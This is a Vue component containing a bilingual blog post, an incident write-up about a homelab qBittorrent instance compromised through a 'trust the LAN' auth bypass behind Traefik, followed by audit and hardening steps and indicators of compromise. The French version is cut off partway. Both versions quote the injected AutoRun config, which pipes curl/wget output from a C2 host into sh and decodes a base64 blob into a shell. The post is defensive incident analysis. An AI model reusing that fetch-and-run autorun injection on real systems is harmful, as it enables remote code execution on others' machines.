<script lang="ts">
import { defineComponent, computed } from 'vue'
import type { PostMetadata, PostContent } from '@/utils/posts'

export const metadata: PostMetadata = {
  slug: 'the-lan-is-dead',
  date: '2026-05-03',
  tags: ['Homelab', 'Security', 'Opinion']
}

const englishContent: PostContent = {
  title: 'The LAN Is Dead. You Built the Reverse Proxy That Killed It.',
  description: 'I run 40+ services behind Traefik. One of them — qBittorrent — trusted my LAN by default. So did my reverse proxy. The internet bypassed my auth, dropped a remote shell, and ran for days before I noticed. Here is what I found, what I changed, and why every homelab with a reverse proxy is one default checkbox away from the same fate.',
  html: `<p><strong>TL;DR:</strong> I run 40+ services behind Traefik on my homelab. One of them — qBittorrent — trusted "the LAN" by default. My reverse proxy <em>lives</em> on the LAN. So every external request, routed through the proxy, looked like a trusted local client. An attacker walked through the front door and injected an <code>OnTorrentAdded</code> autorun pulling a remote shell. I noticed because the UI looked weird. Not because of an alert. Because of a vibe. Then I audited the other 39 services — <strong>3 admin UIs were wide open to the internet.</strong> If you run a homelab with a reverse proxy and any "trust the LAN" toggle is enabled somewhere, you are likely running my homelab from a week ago.</p>
<hr>
<p>For months I told myself my homelab was fine. It wasn't. And yours probably isn't either.</p>
<p>This is the post I owe my future self. It's also the post I owe anyone who runs a self-hosted stack behind a reverse proxy and assumes that "the LAN is trusted" is still a thing. <strong>It is not.</strong> The LAN died the moment you put Traefik — or Caddy, or nginx, or Cloudflare Tunnel, or Tailscale Funnel — in front of your apps. Most homelab tutorials end at "and now it's behind HTTPS." That sentence is doing a lot of unearned work.</p>

<h2>The vibe check that saved me</h2>
<p>I opened qBittorrent's WebUI for an unrelated reason. The status bar at the bottom was red. <strong>External IP: N/A. DHT: 0 nodes.</strong> Every torrent showed 0 peers, 0 B/s. My first thought, like anyone running a VPN-routed torrent client, was that the WireGuard tunnel had dropped.</p>
<p>The tunnel was fine. <code>wg show</code> reported a handshake 36 seconds ago. The container had pushed 283 GiB through it. <code>curl ifconfig.io</code> from inside the container returned the VPN exit IP. The network was healthy. <strong>The app was lying.</strong></p>
<p>So I read the config. And there it was, sitting calmly at the top of <code>qBittorrent.conf</code>:</p>
<pre><code>[AutoRun]
OnTorrentAdded\\Enabled=true
OnTorrentAdded\\Program=sh -c "(curl -s http://&lt;c2-domain&gt; || wget -qO - http://&lt;c2-domain&gt;) | sh"
enabled=true
program="sh -c \\"echo &lt;base64-blob&gt; | base64 -d | sh\\""</code></pre>
<p>Every torrent added → arbitrary remote code, executed inside the qBit container, with the qBit user's privileges and access to every bind mount and the VPN namespace. The C2 was alive. Last-modified on the dropper: two days before I found it. Caddy was happily serving the payload.</p>
<p>I stopped the container.</p>

<h2>The flaw is not qBittorrent. The flaw is the model.</h2>
<p>Here is the part that matters, and it is why I am writing this post instead of pasting an <code>incident.md</code> into a private wiki and calling it a Tuesday.</p>
<p>qBittorrent has a setting called <code>WebUI\\AuthSubnetWhitelist</code>. It accepts a list of CIDRs. Requests from a source IP inside any of those CIDRs <strong>bypass authentication entirely.</strong> It defaults to off. I had it on, with the standard "I trust my LAN" CIDRs:</p>
<pre><code>WebUI\\AuthSubnetWhitelist=10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
WebUI\\AuthSubnetWhitelistEnabled=true</code></pre>
<p>This is a feature, not a bug. The qBittorrent issue tracker has discussed it for years. It is working as designed.</p>
<p>Here is the problem. <strong>qBit's check uses the TCP source IP</strong> — the actual layer-4 peer that opened the socket. When a request comes through Traefik, qBit's TCP peer is <em>Traefik's container IP</em>, which lives at <code>172.x.x.x</code> on the docker bridge network. <strong>That IP is in the whitelist.</strong> Every request from the public internet, routed through Traefik, looked to qBittorrent like a trusted LAN client.</p>
<p>There is no header trick, no <code>X-Forwarded-For</code> confusion, no oversight. The bypass is unconditional. The auth was never running.</p>
<p>The deeper problem isn't qBit's setting. It is the entire mental model that produced it. <strong>"Trust the LAN" was a defensible default in 2010</strong>, when homelabs were physically air-gapped from the internet and "the network" meant a switch in your basement. In 2026, your "LAN" includes a reverse proxy that's reachable from anywhere on Earth, an SDN docker bridge that contains every container's outbound, an inbound tunnel from your CDN, your phone's Tailscale node sitting in a hotel WiFi, and a half-dozen automation users that exist to talk to your stuff over HTTP. <strong>The LAN is no longer a place. It is an implementation detail of where the auth check happens to fall.</strong></p>
<p>Self-hosted apps shipped permissive "LAN allow" defaults assuming a LAN nobody actually has anymore. Cloudflare Tunnel, Tailscale Funnel, Traefik, Caddy — they move the perimeter, they do not replace authn. The reverse proxy is a <em>hallway</em>, not a <em>door</em>.</p>

<h2>The blast radius: I audited 40 services. 3 were wide open.</h2>
<p>I had to know how bad it was. So I walked every Traefik-exposed router on the box and probed each one from outside the LAN. The result wasn't 0 of 40. It wasn't 1.</p>
<p><strong>Three were unauthenticated to the internet.</strong></p>
<ul>
<li><strong>qBittorrent</strong> — already on fire. Trust-LAN bypass.</li>
<li><strong>A real-time docker log viewer.</strong> No auth env, no middleware. Its <code>/api/events/stream</code> endpoint streamed the entire container fleet to anyone with the URL. The companion log endpoint streams stdout/stderr from any container the host runs. That includes every secret, token, request body, OAuth code, webhook signature, and database query that any service in the stack ever logs. <strong>A static dashboard with a hostname guessable from a TLS transparency feed gave a stranger a real-time SIEM of my entire infra.</strong></li>
<li><strong>A Plex statistics dashboard.</strong> Empty <code>http_password=""</code> in its config. The full Home view was a <code>GET /home</code> away. Watch history, IP addresses of every viewer, embedded Plex auth tokens, notification webhooks (Discord, Slack — with their secrets in the payload).</li>
</ul>
<p>Each of those was one URL guess away. Each was visible from any TLS transparency monitor — <a target="_blank" rel="noopener noreferrer" href="https://crt.sh">crt.sh</a> will happily list every subdomain on a wildcard cert. And each had its own native auth that I had explicitly turned off because — wait for it — <strong>"it's only on the LAN."</strong></p>
<p>The compromise blast radius wasn't qBittorrent. It was every secret my stack had ever leaked into a log line. Container escape was unlikely (no privileged, no docker socket). Lateral movement via shared volumes was on the table. Sustained C2 traffic exited via my paid VPN — meaning my legal exposure was the VPN provider's egress IP, not mine. Cold comfort.</p>
<p>Severity, called honestly: <strong>high impact, low sophistication.</strong> The dropper has the fingerprints of the long-running cryptominer campaigns that have been hammering qBit AutoRun since 2023. Multi-arch (x86_64 / aarch64 / amd64), 8-character random binary names, drop → <code>chmod +x</code> → execute → <code>rm -rf</code> to leave nothing on disk, multi-tool downloader fallbacks (curl → wget → python3 → perl HTTP::Tiny → raw <code>IO::Socket::INET</code>). The operator wasn't targeting me. They were spraying every qBit on the public internet with the AutoRun feature available. I was a number in a list.</p>
<p>The same primitive in skilled hands gets a lot worse. The shared <code>/data/downloads</code> mount runs straight into Plex's process. The arr stack's API keys sit in env files on the same box. The lesson isn't that I dodged a bullet — it is that the bullet was generic, and a custom one would have been catastrophic.</p>

<h2>What "behind Traefik" actually means</h2>
<p>Read any homelab tutorial from the last five years. The instructions follow a pattern: deploy the service, point Traefik at it with a <code>Host()</code> rule, get a Let's Encrypt cert, done. The implicit assumption is that Traefik is a security boundary.</p>
<p>It isn't. Traefik is a <em>router</em>. By default it routes whatever it can reach to whoever asks for it. If the upstream service has auth, requests get authenticated. If it doesn't, they don't. Traefik will happily proxy an unauthenticated dashboard to the public internet for years and never warn you, because that is <strong>literally what you configured it to do.</strong></p>
<p>The mental fix is to treat the reverse proxy as untrusted infrastructure that <em>forwards</em> traffic. The auth boundary is the application's auth, or a forwardAuth middleware in front of it. <strong>There is no third option.</strong> "Reachable on the LAN only" is the second option pretending to be a third one. If your reverse proxy can reach the upstream, and the public internet can reach your reverse proxy, the upstream is on the public internet.</p>
<p>This generalizes. The same trap exists in:</p>
<ul>
<li>Sonarr, Radarr, Lidarr, Prowlarr — <code>Authentication Required &gt; "Disabled for Local Addresses"</code>. Don't.</li>
<li>Plex — <code>"Allow connections without auth on my local network"</code>. Don't, especially with a reverse proxy in the same subnet.</li>
<li>Home Assistant — <code>trusted_proxies</code> + <code>use_x_forwarded_for=true</code> without a real allowlist.</li>
<li>Grafana — anonymous mode, or <code>auth.proxy</code> headers from a proxy you don't fully trust.</li>
<li>Pi-hole — admin password reuse + open API.</li>
<li>Tautulli, older Jellyfin, basically anything with a "trust LAN" toggle from the pre-Tailscale era.</li>
</ul>
<p>If a checkbox in your service config says <em>"don't require auth from local network"</em> and your service is also reachable through any reverse proxy, <strong>untick that checkbox.</strong> Today.</p>

<h2>The fix, in layers</h2>
<p>Cleanup happened in three passes: stop the bleeding, then audit, then harden.</p>

<h3>Stop the bleeding</h3>
<p>The C2 callback is a known-bad fileless dropper. Three layers of blocking, because each layer catches what the previous one misses:</p>
<ol>
<li><strong>DNS sinkhole</strong> at Pi-hole, exact-match deny on the C2 hostname. Catches anything resolving by name. Doesn't help with IP-literal callbacks.</li>
<li><strong>Host iptables <code>OUTPUT</code> + <code>FORWARD</code> drops</strong> on the C2 IP. Catches the IP-literal path and any container egress that exits via the host's default route. Persisted across reboots via <code>netfilter-persistent</code>.</li>
<li><strong>Edge firewall (<code>WAN_OUT</code> drop)</strong> on the gateway, scoped to the C2 IP via an address group. Catches anything that bypasses the host (other VLANs, IoT, the printer, your kid's laptop).</li>
</ol>
<p>A single layer would be a checkbox. Three layers is defense-in-depth that accepts that any one of them might be wrong.</p>

<h3>Sanitize and audit</h3>
<p>For the compromised app: removed the entire <code>[AutoRun]</code> block, disabled <code>AuthSubnetWhitelistEnabled</code>, rotated the WebUI password (with proper PBKDF2-HMAC-SHA512 hashing, not a UI form click — generate the salt + hash yourself if you want to know what's in your config), preserved a forensic copy of the config and the dropper for later reference, and pulled the running container's process list looking for the fileless tell:</p>
<pre><code>ls -la /proc/*/exe 2&gt;/dev/null | grep deleted</code></pre>
<p>That's the canonical IoC for the drop-exec-rm pattern: a process whose binary inode no longer exists on disk. None showed up. Stage 2 had run, sent home what it sent home, and exited cleanly when the container went down.</p>
<p>For everything else: I read every Traefik router's labels, listed which had a <code>middlewares=</code> line, and grouped the rest by their internal auth state. Three were open. The rest were either fine on their own merits or arguably fine for their threat model. <em>Arguably</em> is doing work in that sentence — see the next section.</p>

<h3>Default-deny the perimeter</h3>
<p>The honest fix isn't "secure the three I missed." It is "stop trusting that I will catch the next one." So I added a uniform forwardAuth middleware (<a target="_blank" rel="noopener noreferrer" href="https://github.com/steveiliop56/tinyauth">TinyAuth</a> — small, single-purpose, fits the blast radius I needed; <a target="_blank" rel="noopener noreferrer" href="https://www.authelia.com/">Authelia</a> or <a target="_blank" rel="noopener noreferrer" href="https://www.authentik.io/">Authentik</a> would do as well) in front of every service whose intended audience is <em>me</em> and not third-party clients. That covered <strong>17 admin UIs</strong>. Anything reachable at <code>&lt;svc&gt;.&lt;domain&gt;</code> now gets a forwardAuth challenge before it touches the upstream. Even if the upstream has its own auth — and it usually does — the forwardAuth gate means an unauthenticated bug in the upstream doesn't ship to the internet.</p>
<p>Services that <em>do</em> need to talk to third parties (mobile apps, SDKs, CLIs, webhooks from external systems, password manager clients, photo-sync clients) stayed on their own auth, with the explicit understanding that I owe each of them a much closer look. That list is shorter than the gated list, and every entry on it is a known weak point I'm now actively monitoring.</p>
<p>The rule going forward is one line in any new service's compose file:</p>
<pre><code>- "traefik.http.routers.&lt;name&gt;.middlewares=tinyauth@docker"</code></pre>
<p>If a new service can't accept that line, that's a deliberate exception, not a default.</p>

<h2>What to do this weekend</h2>
<p>If you run a homelab — any size, any reverse proxy, any number of services — here are the four checks that catch 90% of this class of bug.</p>

<p><strong>1. Grep for trust-LAN toggles.</strong></p>
<pre><code>grep -rIE "AuthSubnet|trust(ed)?_?(network|proxy|host)|allowed_hosts|local.?bypass|skip.?auth.?local|disabled_for_local" \\
  /opt/docker /etc 2&gt;/dev/null</code></pre>
<p>If any of those are enabled and the service is reachable through your reverse proxy, you have my last week's homelab. The qBit-specific check:</p>
<pre><code>grep -rE "AuthSubnetWhitelistEnabled=true" /opt/docker</code></pre>
<p><strong>2. List every Traefik router and its middlewares.</strong></p>
<pre><code>for f in /opt/docker/*/compose.yml; do
  awk '/traefik\\.http\\.routers\\..*\\.rule=.*Host/,/networks:/' "$f" \\
    | grep -E "routers\\.[a-z0-9-]+\\.(rule|middlewares)" \\
    | sort -u
done</code></pre>
<p>Sort by router name. Any router without a <code>middlewares=</code> line is running on its own internal auth alone. That is a <em>deliberate choice</em>, not a default. Make sure each one is a choice you remember making.</p>

<p><strong>3. Hit every admin URL from your phone on cellular.</strong> Off-LAN, no Tailscale, no nothing. If anything responds with anything other than a redirect to a login or a 401, it's reachable from the internet. Now ask whether you want it to be.</p>

<p><strong>4. Check <code>[AutoRun]</code> and equivalents on anything that runs untrusted input.</strong> qBittorrent's <code>[AutoRun]</code> section. Sonarr/Radarr's "Connect" custom-script connections. Home Assistant's <code>shell_command</code> service. Jellyfin's webhook plugin. n8n workflow webhooks if any are publicly reachable. If you didn't put it there, it shouldn't be there.</p>

<p>The reader who runs five services with Caddy: same exercise, smaller surface. The <em>idea</em> doesn't depend on Traefik or 40 services. <strong>The mental model that "LAN is trusted" is the bug.</strong> Replace it.</p>

<h2>A note on the things you can't audit yourself</h2>
<p>I had three things wide open. Two of them were apps I'd installed years ago and never re-checked. One was an empty <code>http_password=""</code> from the day I deployed it, never touched. <strong>Configuration drift toward open is the natural state of a homelab.</strong> You add services, you tweak settings, you forget defaults, you upgrade and lose a config flag, you read a tutorial that says "for testing" and never come back. The audit is not a one-time event. It's a recurring chore, on a calendar, like an oil change.</p>
<p>And: <strong>do not trust your monitoring to catch this for you.</strong> I had Beszel, Uptime Kuma, Dozzle, Pi-hole's query log, the lot. None of them flagged anything because nothing was <em>failing</em>. The compromise was inside the application, and the application was working <em>better</em> than usual from the attacker's perspective. The signal that found it was visual: a red icon I happened to look at. There is no SIEM in a homelab. You are the SIEM, and your eyes are not a query language.</p>

<h2>Indicators of compromise</h2>
<p>If you run qBittorrent and want to confirm you weren't hit by the same wave, here's what to look for. These are the IoCs from this incident; they're public defenders' information.</p>
<ul>
<li><strong>C2 domain:</strong> <code>yify.foo</code></li>
<li><strong>C2 IP:</strong> <code>172.245.88.160</code> (ColoCrossing, the same range that hosts a long list of similar mass-exploitation droppers)</li>
<li><strong>Stage 1 in <code>qBittorrent.conf</code>:</strong> any <code>[AutoRun]</code> block with <code>OnTorrentAdded\\Program</code> piping output to <code>sh</code></li>
<li><strong>Stage 2 dropper</strong> (1945 bytes, served from <code>http://yify.foo/</code>): multi-arch shell script, branches on <code>uname -m</code>, fetches a binary from <code>/1</code>, <code>/2</code>, or <code>/3</code> on the C2 IP, drops to every writable mount with a random 8-char name, executes, deletes the file</li>
<li><strong>Process IoC:</strong> <code>ls -la /proc/*/exe 2&gt;/dev/null | grep deleted</code> — fileless stage-2 process whose binary inode is gone</li>
<li><strong>Network IoC:</strong> outbound DNS for <code>yify.foo</code> or any TCP to <code>172.245.88.160</code> from a container running qBit, sonarr, radarr, plex, or anything sharing their volumes</li>
</ul>
<p>If you find any of these, treat the host as compromised: stop the affected container, sanitize the config, rotate every credential the container had access to, block the C2 at three layers (DNS, host, edge), and audit the rest of your stack for the same pattern. Don't just kill the process — that's stage 2, the autorun config will respawn it on the next torrent add.</p>

<h2>Closing</h2>
<p>I have spent 9 years writing software for hospitals. I hold opinions about systems with strong consequences. I still got owned by a default checkbox.</p>
<p>The lesson is not that homelabs are unsafe. They're as safe as you make them. The lesson is that the model has shifted. <em>Behind the proxy</em> used to mean <em>behind the perimeter</em>. It does not, anymore. The proxy <em>is</em> the perimeter, and the perimeter is paper-thin if the apps behind it think they're on a trusted LAN.</p>
<p><strong>Your reverse proxy is not a firewall. It's a hallway.</strong> If you don't have a door at the end of it, your apps are standing in a public lobby. Mine were. Three of them, anyway.</p>
<p>Not anymore.</p>`
}

const frenchContent: PostContent = {
  title: 'Le LAN est mort. C\'est votre reverse proxy qui l\'a tué.',
  description: 'Je fais tourner 40+ services derrière Traefik sur mon homelab. L\'un d\'eux — qBittorrent — faisait confiance au "LAN" par défaut. Mon reverse proxy aussi vit sur ce LAN. Internet a contourné mon authentification, déposé un shell distant, et tourné pendant des jours avant que je le remarque. Voici ce que j\'ai trouvé, ce que j\'ai changé, et pourquoi tout homelab avec un reverse proxy est à une case cochée par défaut du même destin.',
  html: `<p><strong>TL;DR :</strong> Je fais tourner 40+ services derrière Traefik sur mon homelab. L'un d'eux — qBittorrent — faisait confiance au "LAN" par défaut. Mon reverse proxy <em>vit</em> sur ce LAN. Donc chaque requête externe, routée via le proxy, ressemblait à un client local de confiance. Un attaquant est entré par la porte d'entrée et a injecté un autorun <code>OnTorrentAdded</code> qui tirait un shell distant. Je l'ai remarqué parce que l'UI avait l'air bizarre. Pas grâce à une alerte. À cause d'une intuition. Puis j'ai audité les 39 autres services — <strong>3 interfaces d'admin étaient grandes ouvertes sur internet.</strong> Si vous faites tourner un homelab avec un reverse proxy et qu'une option "fais confiance au LAN" est activée quelque part, vous faites probablement tourner mon homelab d'il y a une semaine.</p>
<hr>
<p>Pendant des mois je me suis dit que mon homelab était propre. Il ne l'était pas. Et le vôtre ne l'est probablement pas non plus.</p>
<p>C'est l'article que je dois à mon moi futur. C'est aussi celui que je dois à toute personne qui fait tourner un stack self-hosted derrière un reverse proxy et qui présume que "le LAN est de confiance" est encore une chose qui existe. <strong>Ça ne l'est plus.</strong> Le LAN est mort à la minute où vous avez mis Traefik — ou Caddy, ou nginx, ou Cloudflare Tunnel, ou Tailscale Funnel — devant vos applis. La plupart des tutos homelab finissent par "et maintenant c'est derrière HTTPS." Cette phrase fait beaucoup de travail qu'elle n'a jamais mérité.</p>

<h2>L'intuition qui m'a sauvé</h2>
<p>J'ai ouvert l'interface qBittorrent pour une raison sans rapport. La barre de statut en bas était rouge. <strong>External IP : N/A. DHT : 0 nodes.</strong> Chaque torrent affichait 0 peers, 0 B/s. Mon premier réflexe, comme n'importe qui qui fait passer son client torrent par un VPN, ça a été : le tunnel WireGuard est tombé.</p>
<p>Le tunnel allait bien. <code>wg show</code> rapportait un handshake il y a 36 secondes. Le conteneur avait poussé 283 GiB à travers. <code>curl ifconfig.io</code> depuis l'intérieur du conteneur retournait l'IP de sortie du VPN. Le réseau allait bien. <strong>L'appli mentait.</strong></p>
<p>Alors j'ai lu la config. Et c'était là, posé tranquillement en haut de <code>qBittorrent.conf</code> :</p>
<pre><code>[AutoRun]
OnTorrentAdded\\Enabled=true
OnTorrentAdded\\Program=sh -c "(curl -s http://&lt;c2-domain&gt; || wget -qO - http://&lt;c2-domain&gt;) | sh"
enabled=true
program="sh -c \\"echo &lt;base64-blob&gt; | base64 -d | sh\\""</code></pre>
<p>Chaque torrent ajouté → exécution de code distant arbitraire, à l'intérieur du conteneur qBit, avec les privilèges de l'utilisateur qBit et l'accès à chaque bind mount et au namespace VPN. Le C2 était vivant. Last-modified sur le dropper : deux jours avant que je le trouve. Caddy servait le payload tranquillement.</p>
<p>J'ai stoppé le conteneur.</p>

<h2>Le défaut n'est pas dans qBittorrent. Il est dans le modèle.</h2>
<p>Voilà la partie qui compte, et c'est pour ça que j'écris cet article au lieu de coller un <code>incident.md</code> dans un wiki privé et de passer à autre chose.</p>
<p>qBittorrent a un paramètre <code>WebUI\\AuthSubnetWhitelist</code>. Il accepte une liste de CIDR. Les requêtes dont l'IP source est dans un de ces CIDR <strong>contournent l'authentification entièrement.</strong> C'est désactivé par défaut. Je l'avais activé, avec les CIDR "je fais confiance au LAN" classiques :</p>
<pre><code>WebUI\\AuthSubnetWhitelist=10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
WebUI\\AuthSubnetWhitelistEnabled=true</code></pre>
<p>C'est une fonctionnalité, pas un bug. Le tracker d'issues qBittorrent en discute depuis des années. Ça fonctionne comme prévu.</p>
<p>Voilà le problème. <strong>La vérification de qBit utilise l'IP TCP source</strong> — le pair de couche 4 réel qui a ouvert le socket. Quand une requête passe par Traefik, le pair TCP de qBit est <em>l'IP du conteneur Traefik</em>, qui vit en <code>172.x.x.x</code> sur le réseau bridge docker. <strong>Cette IP est dans la whitelist.</strong> Chaque requête depuis l'internet public, routée via Traefik, ressemblait pour qBittorrent à un client LAN de confiance.</p>
<p>Pas de header trick, pas de confusion <code>X-Forwarded-For</code>, pas d'oubli. Le contournement est inconditionnel. L'authentification ne tournait jamais.</p>
<p>Le problème plus profond n'est pas le paramètre de qBit. C'est le modèle mental entier qui l'a produit. <strong>"Faire confiance au LAN" était une option par défaut défendable en 2010</strong>, quand les homelabs étaient physiquement séparés d'internet et que "le réseau" voulait dire un switch dans le sous-sol. En 2026, votre "LAN" comprend un reverse proxy joignable depuis n'importe où sur la planète, un bridge docker SDN qui contient le sortant de chaque conteneur, un tunnel entrant depuis votre CDN, le node Tailscale de votre téléphone posé dans le WiFi d'un hôtel, et une demi-douzaine d'utilisateurs d'automatisation qui existent juste pour parler à vos services en HTTP. <strong>Le LAN n'est plus un endroit. C'est un détail d'implémentation sur le lieu où la vérification d'auth se trouve.</strong></p>
<p>Les applis self-hosted ont livré des défauts permissifs "autoriser le LAN" en supposant un LAN que plus personne n'a. Cloudflare Tunnel, Tailscale Funnel, Traefik, Caddy — ils déplacent le périmètre, ils ne remplacent pas l'authn. Le reverse proxy est un <em>couloir</em>, pas une <em>porte</em>.</p>

<h2>Le rayon d'explosion : 40 services audités. 3 grands ouverts.</h2>
<p>Il fallait que je sache à quel point c'était grave. Donc j'ai parcouru chaque routeur Traefik exposé sur la box et j'ai sondé chacun depuis l'extérieur du LAN. Le résultat n'était pas 0 sur 40. Ce n'était pas 1.</p>
<p><strong>Trois étaient sans authentification depuis internet.</strong></p>
<ul>
<li><strong>qBittorrent</strong> — déjà en feu. Contournement trust-LAN.</li>
<li><strong>Un visualiseur de logs docker en temps réel.</strong> Pas de variable d'env d'auth, pas de middleware. Son endpoint <code>/api/events/stream</code> diffusait toute la flotte de conteneurs à quiconque connaissait l'URL. L'endpoint compagnon de logs streame les stdout/stderr de n'importe quel conteneur tournant sur l'hôte. Ça inclut chaque secret, token, request body, code OAuth, signature de webhook et requête de base de données que n'importe quel service du stack a un jour loggué. <strong>Un dashboard statique avec un hostname devinable depuis un flux TLS transparency a donné à un inconnu un SIEM en temps réel de toute mon infra.</strong></li>
<li><strong>Un dashboard de statistiques Plex.</strong> <code>http_password=""</code> vide dans sa config. La vue Home complète était à un <code>GET /home</code> de distance. Historique de visionnage, IPs de chaque viewer, tokens d'auth Plex embarqués, webhooks de notification (Discord, Slack — avec leurs secrets dans le payload).</li>
</ul>
<p>Chacun était à un guess d'URL près. Chacun était visible depuis n'importe quel monitor TLS transparency — <a target="_blank" rel="noopener noreferrer" href="https://crt.sh">crt.sh</a> liste volontiers chaque sous-domaine sur un certificat wildcard. Et chacun avait sa propre auth native que j'avais explicitement désactivée parce que — attendez — <strong>"c'est juste sur le LAN."</strong></p>
<p>Le rayon d'explosion du compromis n'était pas qBittorrent. C'était chaque secret que mon stack avait jamais laissé fuiter dans une ligne de log. Une évasion de conteneur était peu probable (pas de privileged, pas de socket docker). Un mouvement latéral via volumes partagés était sur la table. Le trafic C2 sortait via mon VPN payant — donc mon exposition légale était l'IP de sortie du fournisseur VPN, pas la mienne. Maigre consolation.</p>
<p>Sévérité, dite honnêtement : <strong>impact élevé, sophistication faible.</strong> Le dropper a les empreintes des campagnes de cryptominers de longue date qui martèlent qBit AutoRun depuis 2023. Multi-arch (x86_64 / aarch64 / amd64), noms de binaire aléatoires de 8 caractères, drop → <code>chmod +x</code> → exécution → <code>rm -rf</code> pour ne rien laisser sur disque, fallbacks multi-outils pour le téléchargement (curl → wget → python3 → perl HTTP::Tiny → socket brut <code>IO::Socket::INET</code>). L'opérateur ne me ciblait pas. Il sprayait chaque qBit sur internet avec la fonctionnalité AutoRun disponible. J'étais un numéro dans une liste.</p>
<p>Le même primitive entre des mains qualifiées devient bien pire. Le mount partagé <code>/data/downloads</code> tape direct dans le process Plex. Les clés API du stack arr sont dans des fichiers env sur la même box. La leçon n'est pas que j'ai esquivé une balle — c'est que la balle était générique, et qu'une balle sur mesure aurait été catastrophique.</p>

<h2>Ce que "derrière Traefik" veut vraiment dire</h2>
<p>Lisez n'importe quel tuto homelab des cinq dernières années. Les instructions suivent un schéma : déployer le service, pointer Traefik dessus avec une règle <code>Host()</code>, récupérer un certificat Let's Encrypt, fini. La supposition implicite, c'est que Traefik est une frontière de sécurité.</p>
<p>Ce n'est pas le cas. Traefik est un <em>routeur</em>. Par défaut il route ce qu'il peut atteindre vers qui le demande. Si le service en amont a une auth, les requêtes sont authentifiées. Sinon, non. Traefik continuera de proxy un dashboard non authentifié vers internet pendant des années sans jamais vous prévenir, parce que c'est <strong>littéralement ce que vous lui avez configuré de faire.</strong></p>
<p>La correction mentale est de traiter le reverse proxy comme une infrastructure non fiable qui <em>transfère</em> du trafic. La frontière d'auth, c'est l'auth de l'application, ou un middleware forwardAuth devant. <strong>Il n'y a pas de troisième option.</strong> "Joignable seulement sur le LAN" est la deuxième option qui se fait passer pour une troisième. Si votre reverse proxy peut atteindre l'amont, et que l'internet public peut atteindre votre reverse proxy, l'amont est sur l'internet public.</p>
<p>Ça se généralise. Le même piège existe dans :</p>
<ul>
<li>Sonarr, Radarr, Lidarr, Prowlarr — <code>Authentication Required &gt; "Disabled for Local Addresses"</code>. Non.</li>
<li>Plex — <code>"Allow connections without auth on my local network"</code>. Non, surtout avec un reverse proxy dans le même subnet.</li>
<li>Home Assistant — <code>trusted_proxies</code> + <code>use_x_forwarded_for=true</code> sans une vraie allowlist.</li>
<li>Grafana — mode anonyme, ou headers <code>auth.proxy</code> depuis un proxy auquel vous ne faites pas pleinement confiance.</li>
<li>Pi-hole — réutilisation du mot de passe admin + API ouverte.</li>
<li>Tautulli, Jellyfin ancien, à peu près tout ce qui a une option "trust LAN" héritée de l'ère pré-Tailscale.</li>
</ul>
<p>Si une case dans la config de votre service dit <em>"ne pas exiger d'auth depuis le réseau local"</em> et que votre service est aussi joignable via n'importe quel reverse proxy, <strong>décochez cette case.</strong> Aujourd'hui.</p>

<h2>La correction, en couches</h2>
<p>Le nettoyage s'est fait en trois passes : arrêter l'hémorragie, puis auditer, puis durcir.</p>

<h3>Arrêter l'hémorragie</h3>
<p>Le callback C2 est un dropper fileless connu. Trois couches de blocage, parce que chaque couche rattrape ce que la précédente rate :</p>
<ol>
<li><strong>Sinkhole DNS</strong> sur Pi-hole, deny exact-match sur le hostname C2. Rattrape tout ce qui résout par nom. N'aide pas avec les callbacks IP littérale.</li>
<li><strong>iptables hôte <code>OUTPUT</code> + <code>FORWARD</code> drop</strong> sur l'IP C2. Rattrape le chemin IP littérale et tout sortant de conteneur qui passe par la route par défaut de l'hôte. Persisté à travers les reboots via <code>netfilter-persistent</code>.</li>
<li><strong>Firewall edge (<code>WAN_OUT</code> drop)</strong> sur la passerelle, scopé à l'IP C2 via un address group. Rattrape tout ce qui contourne l'hôte (autres VLANs, IoT, l'imprimante, le portable de votre gosse).</li>
</ol>
<p>Une seule couche serait une case à cocher. Trois couches, c'est de la défense en profondeur qui accepte qu'une d'elles peut être fausse.</p>

<h3>Sanitiser et auditer</h3>
<p>Pour l'appli compromise : suppression du bloc <code>[AutoRun]</code> entier, désactivation de <code>AuthSubnetWhitelistEnabled</code>, rotation du mot de passe WebUI (avec un hash PBKDF2-HMAC-SHA512 propre, pas un clic dans le formulaire UI — générez le sel + hash vous-même si vous voulez savoir ce qui est dans votre config), conservation d'une copie forensique de la config et du dropper pour référence, et inspection de la liste des process du conteneur en cherchant le tell fileless :</p>
<pre><code>ls -la /proc/*/exe 2&gt;/dev/null | grep deleted</code></pre>
<p>C'est l'IoC canonique du pattern drop-exec-rm : un process dont l'inode du binaire n'existe plus sur disque. Aucun n'est apparu. Le stage 2 avait tourné, envoyé ce qu'il avait à envoyer, et était sorti proprement quand le conteneur s'est arrêté.</p>
<p>Pour le reste : j'ai lu les labels de chaque routeur Traefik, listé lesquels avaient une ligne <code>middlewares=</code>, et groupé le reste par leur état d'auth interne. Trois étaient ouverts. Le reste était soit propre par ses propres mérites soit défendable pour leur threat model. <em>Défendable</em> fait du travail dans cette phrase — voir la section suivante.</p>

<h3>Default-deny au périmètre</h3>
<p>La correction honnête n'est pas "sécuriser les trois que j'ai ratés." C'est "arrêter de faire confiance au fait que je rattraperai le suivant." Donc j'ai ajouté un middleware forwardAuth uniforme (<a target="_blank" rel="noopener noreferrer" href="https://github.com/steveiliop56/tinyauth">TinyAuth</a> — petit, monoTâche, taille de blast radius dont j'avais besoin ; <a target="_blank" rel="noopener noreferrer" href="https://www.authelia.com/">Authelia</a> ou <a target="_blank" rel="noopener noreferrer" href="https://www.authentik.io/">Authentik</a> feraient aussi l'affaire) devant chaque service dont le public visé c'est <em>moi</em> et pas des clients tiers. Ça a couvert <strong>17 interfaces d'admin</strong>. Tout ce qui est joignable à <code>&lt;svc&gt;.&lt;domain&gt;</code> reçoit maintenant un challenge forwardAuth avant de toucher l'amont. Même si l'amont a sa propre auth — et c'est généralement le cas — la barrière forwardAuth fait qu'un bug d'auth dans l'amont ne sort pas vers internet.</p>
<p>Les services qui <em>ont besoin</em> de parler à des tiers (apps mobiles, SDKs, CLIs, webhooks d'origine externe, clients de gestionnaires de mot de passe, clients de sync photos) sont restés sur leur propre auth, avec la compréhension explicite que je leur dois à chacun un examen bien plus serré. Cette liste est plus courte que la liste des services barrés, et chaque entrée est un point faible connu que je surveille activement maintenant.</p>
<p>La règle pour la suite, c'est une ligne dans le compose de tout nouveau service :</p>
<pre><code>- "traefik.http.routers.&lt;name&gt;.middlewares=tinyauth@docker"</code></pre>
<p>Si un nouveau service ne peut pas accepter cette ligne, c'est une exception délibérée, pas un défaut.</p>

<h2>Ce qu'il faut faire ce week-end</h2>
